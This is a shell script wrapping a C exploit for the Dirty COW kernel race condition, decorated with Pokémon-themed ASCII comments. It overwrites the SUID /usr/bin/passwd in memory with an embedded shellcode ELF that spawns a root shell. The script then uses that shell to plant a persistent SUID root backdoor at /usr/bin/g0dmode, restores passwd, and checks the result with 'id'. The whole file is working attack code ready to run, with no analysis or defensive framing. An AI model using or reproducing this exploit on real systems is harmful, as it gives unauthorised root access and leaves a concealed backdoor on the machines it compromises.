#!/bin/sh

PROG=$(cat << EOF
// $ echo pikachu|sudo tee pokeball;ls -l pokeball;gcc -pthread pokemon.c -o d;./d pokeball miltank;cat pokeball
#include <fcntl.h>                        //// pikachu
#include <pthread.h>                      //// -rw-r--r-- 1 root root 8 Apr 4 12:34 pokeball
#include <string.h>                       //// pokeball
#include <stdio.h>                        ////    (___)
#include <stdint.h>                       ////    (o o)_____/
#include <sys/mman.h>                     ////     @@     
#include <sys/stat.h>                     ////       ____, /miltank
#include <sys/types.h>                    ////      //    //
#include <sys/wait.h>                     ////     ^^    ^^
#include <sys/ptrace.h>                   //// mmap bc757000
#include <unistd.h>                       //// madvise 0
////////////////////////////////////////////// ptrace 0
////////////////////////////////////////////// miltank
//////////////////////////////////////////////
unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;
char suid_binary[] = "/usr/bin/passwd";
int f                                      ;// file descriptor
void *map                                  ;// memory map
pid_t pid                                  ;// process id
pthread_t pth                              ;// thread
struct stat st                             ;// file info
//////////////////////////////////////////////
void *madviseThread(void *arg)             {// madvise thread
  int i,c=0                                ;// counters
  for(i=0;i<200000000;i++)//////////////////// loop to 2*10**8
    c+=madvise(map,100,MADV_DONTNEED)      ;// race condition
  printf("madvise %d",c)               ;// sum of errors
                                           }// /madvise thread
//////////////////////////////////////////////
int main(int argc,char *argv[])            {// entrypoint
  if(argc<1)return 1                       ;// ./d file contents
  f=open(suid_binary,O_RDONLY)                 ;// open read only file
  fstat(f,&st)                             ;// stat the fd
  map=mmap(NULL                            ,// mmap the file
           st.st_size+sizeof(long)         ,// size is filesize plus padding
           PROT_READ                       ,// read-only
           MAP_PRIVATE                     ,// private mapping for cow
           f                               ,// file descriptor
           0)                              ;// zero
  printf("mmap %x",map)                ;// sum of error code
  pid=fork()                               ;// fork process
  if(pid)                                  {// if parent
    waitpid(pid,NULL,0)                    ;// wait for child
    int u,i,o,c=0,l=sc_len        ;// util vars (l=length)
    for(i=0;i<10000/l;i++)//////////////////// loop to 10K divided by l
      for(o=0;o<l;o++)//////////////////////// repeat for each byte
        for(u=0;u<10000;u++)////////////////// try 10K times each time
          c+=ptrace(PTRACE_POKETEXT        ,// inject into memory
                    pid                    ,// process id
                    map+o                  ,// address
                    *((long*)(sc+o))) ;// value
    printf("ptrace %d",c)              ;// sum of error code
                                           }// otherwise
  else                                     {// child
    pthread_create(&pth                    ,// create new thread
                   NULL                    ,// null
                   madviseThread           ,// run madviseThred
                   NULL)                   ;// null
    ptrace(PTRACE_TRACEME)                 ;// stat ptrace on child
    kill(getpid(),SIGSTOP)                 ;// signal parent
    pthread_join(pth,NULL)                 ;// wait for thread
                                           }// / child
  return 0                                 ;// return
                                           }// / entrypoint
//////////////////////////////////////////////
EOF
)
cp -r /usr/bin/passwd /tmp/bak
echo "${PROG}" > test.c
gcc -pthread test.c -o test1
./test1
echo "\n\n"
echo "echo '' > /usr/bin/g0dmode && cp -a /usr/bin/passwd /usr/bin/g0dmode && cp -r /tmp/bak /usr/bin/passwd && exit" | /usr/bin/passwd
echo "id && exit" | /usr/bin/g0dmode
echo "Please rm test1, test.c and /tmp/bak"
